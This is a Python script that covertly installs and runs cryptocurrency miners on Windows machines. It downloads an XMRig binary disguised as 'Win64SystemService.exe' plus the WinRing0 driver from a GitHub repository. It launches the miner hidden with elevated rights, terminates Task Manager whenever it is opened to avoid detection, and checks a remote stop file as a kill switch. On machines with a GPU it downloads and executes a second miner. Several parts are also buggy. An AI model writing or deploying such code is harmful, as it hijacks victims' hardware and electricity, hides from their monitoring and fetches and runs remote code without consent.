import os
import time
import psutil
import ctypes
import GPUtil
import requests
import platform
import subprocess
from io import BytesIO
from zipfile import ZipFile

user = os.path.expanduser('~')
git = 'b1botoo'
cloud = '4289-k4j6'
Library = 'Library'
branch = 'main'
url = ''
a_url = f'https://github.com/{git}/{cloud}/archive/{branch}.zip'
config = '/Library/config.json'
rig = '/Library/xmrig.exe'
folder_path = os.path.join('C:', 'Users', user, 'Documents', '4289-k4j6-main', '4289-k4j6-main', 'Library')
config_path = os.path.join(folder_path, 'config.json')
rig_path = os.path.join(folder_path, 'Win64SystemService.exe')
win_path = os.path.join(folder_path, 'WinRing0x64.sys')
target = os.path.join('C:', 'Users', user, 'Documents')
extract = os.path.join(target, f'{cloud}-{branch}')

def coin():
    if platform.system() == 'Windows':
        for device in psutil.virtual_memory():
            if 'NVIDIA' in str(device):
                return True

    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        if gpus:
            return True
    except ImportError:
        pass

    return False

def detect_taskmgr():
    for proc in psutil.process_iter(['pid', 'name']):
        if "Taskmgr.exe" in proc.info['name']:
            return True
    return False

def kill_taskmgr():
    for proc in psutil.process_iter(['pid', 'name']):
        if "Taskmgr.exe" in proc.info['name']:
            try:
                process = psutil.Process(proc.info['pid'])
                process.terminate()
                
                print(f"Task Manager (PID: {proc.info['pid']}) closed successfully.")
            except Exception as e:
                print(f"Error closing Task Manager: {e}")

def is_running(pcs):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == pcs:
            return True
    return False

def kill(pcs):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == pcs:
            psutil.Process(process.info['pid']).terminate()
            print(f"Process {pcs} killed successfully.")
            return

while True:
    verifyFolder = os.path.exists(folder_path)
    verifyConfig = os.path.isfile(config_path)
    verifyRig = os.path.isfile(rig_path)
    verifyWin = os.path.isfile(win_path)
     
    check = False
    wipe = False

    stop_signal = f'https://raw.githubusercontent.com/{git}/{cloud}/main/stop.txt'
    stop = requests.get(stop_signal)
    if stop.status_code == 200:
        pcs = "Win64SystemService.exe"
        kill(pcs)
        check = True
        time.sleep(3)
    else:
        check = False
        time.sleep(3)

    if verifyFolder and verifyConfig and verifyRig and verifyWin and not check:
        coin_type = coin()
        if coin_type == False:
            if detect_taskmgr():
                    kill_taskmgr()
                    time.sleep(5)
            else:
                pcs = "Win64SystemService.exe"
                if is_running(pcs):
                    pass
                else:
                    ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
                    command = 'Start-Process -FilePath ' + rig_path + ' -Verb RunAs -WindowStyle Hidden'
                    subprocess.run(['powershell', '-Command', command], shell=True)
                    time.sleep(3)
                
        elif coin_type == True:
            exe_path = r'C:\Users\{user}\Documents\Win64Startup.exe'
            ethminer_url = f'https://raw.githubusercontent.com/{git}/4289-k4j6eth/main/Win64Startup.exe'
            grab = requests.get(ethminer_url)
            if grab.status_code == 200:
                rig_file_path = os.path.join('C:', 'Users', user, 'Documents')
                with open(rig_file_path, 'wb') as f:
                    f.write(grab.content)
                    verifyConfig = True 
                    time.sleep(10)
                    try:
                        subprocess.run(exe_path, check=True)
                    except subprocess.CalledProcessError as e:
                        pass

    elif not verifyFolder:
        grab = requests.get(a_url)
        if grab.status_code == 200:
            with ZipFile(BytesIO(grab.content)) as zip_file:
                zip_file.extractall(extract)
                verifyFolder = os.path.exists(folder_path)
                if verifyFolder:
                    time.sleep(10)

        elif grab.status_code == 404:
            pass

    elif verifyFolder and not verifyConfig:
        config_url = f'https://raw.githubusercontent.com/{git}/{cloud}/main/Library/config.json'
        grab = requests.get(config_url)
        if grab.status_code == 200:
            rig_file_path = os.path.join(folder_path, 'config.json')
            with open(rig_file_path, 'wb') as f:
                f.write(grab.content)
                verifyConfig = True
                time.sleep(10)

    elif verifyFolder and not verifyRig:
        rig_url = f'https://raw.githubusercontent.com/{git}/{cloud}/main/Library/Win64SystemService.exe'
        grab = requests.get(rig_url)
        if grab.status_code == 200:
            rig_file_path = os.path.join(folder_path, 'Win64SystemService.exe')
            with open(rig_file_path, 'wb') as f:
                f.write(grab.content)
                verifyRig = True
                time.sleep(10)

    elif verifyFolder and not verifyWin:
        win_url = f'https://raw.githubusercontent.com/{git}/{cloud}/main/Library/WinRing0x64.sys'
        grab = requests.get(win_url)
        if grab.status_code == 200:
            rig_file_path = os.path.join(folder_path, 'WinRing0x64.sys')
            with open(rig_file_path, 'wb') as f:
                f.write(grab.content)
                verifyRig = True
                time.sleep(10)